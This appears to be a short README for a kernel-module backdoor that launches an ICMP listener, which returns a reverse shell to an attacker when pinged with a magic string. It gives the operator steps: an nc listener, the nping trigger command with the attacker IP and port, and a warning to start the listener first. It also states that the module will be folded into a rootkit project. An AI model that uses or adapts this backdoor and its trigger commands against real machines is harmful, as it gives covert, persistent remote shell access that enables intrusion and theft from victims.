Kernel module invoked reverse shell
===================================

When this kernel module is installed
it invokes an icmp listener script,
this script sends a reverse shell in response
to an attacker ping.

Using nc -l [PORT] and then in a separate window running
nping --icmp -c 1 -dest-ip [victim ip] --data-string 'maK_it_$H3LL [attacker ip] [PORT]'
we can ping the victim machine and send ourselves back a reverse shell.
Make sure to have a netcat listener waiting on the port you specify before pinging.

This demonstrates how a user-land script/app can be invoked from the kernel

This functionality will be added as part of the final rootkit that is being
developed as part of this project https://web.archive.org/web/20190119045332/https://r00tkit.me/
